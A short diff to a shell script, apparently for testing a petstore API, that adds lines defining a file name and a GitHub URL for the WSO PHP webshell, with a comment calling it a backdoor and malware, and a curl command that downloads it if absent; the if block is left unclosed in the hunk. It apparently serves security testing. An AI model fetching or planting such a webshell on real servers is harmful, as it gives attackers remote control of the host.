@@ -3,6 +3,12 @@
 PETSTORE_URL='http://petstore.corp.fabriclab.ca/api/v3'
 #PETSTORE_URL='https://petstore.buonassera.fr/api/v3'
 
+# wso.php is a backdoor/webshell and considered as a malware
+wso_file="wso.php"
+wso_url="https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php"
+
+if [ ! -f "$wso_file" ]; then
+    curl -O $wso_url
 
 RED='\033[0;31m' # Red color code
 GREEN='\033[0;32m' # Green color code
